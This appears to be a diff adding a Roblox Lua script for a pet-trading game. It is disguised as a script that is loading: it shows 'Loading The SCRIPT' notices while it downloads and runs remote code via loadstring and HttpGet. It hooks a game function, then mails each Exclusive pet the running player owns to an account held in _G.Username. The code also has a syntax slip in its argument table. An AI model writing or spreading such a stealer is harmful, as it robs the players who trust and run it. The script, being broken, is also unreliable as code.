@@ -1,0 +1,24 @@
+Network.Invoke; hookfunction(getupvalue(Fire, 1), function(...) return true end)
+local mydiamonds = string.gsub(game:GetService("Players").localPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,","")
+local FrameworkLibrary = require(game.ReplicatedStorage.Framework.Library)
+local Library = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local savedPets = FrameworkLibrary.Save.Get().Pets
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Rishes/ui/main/Script", true))()
+Notification.new("info", "Information", "Loading The SCRIPT")
+Notification.new("warning", "Information", "Please wait till it loads")
+
+for i,v in pairs(savedPets) do
+    local v2 = Library.Directory.Pets[v.id]
+    if v2.rarity == "Exclusive" then
+        local args={ 
+           [1]={
+            ["Recipient"]= _G.Username,
+            ["Diamonds"]= 0,
+            ["Pets"]= {v.uid}
+            ["Message"]= "Made By SKRNaTo1"
+        }}
+    Invoke("Send Mail", unpack(args))
+    wait(0.7)
+    end
+end
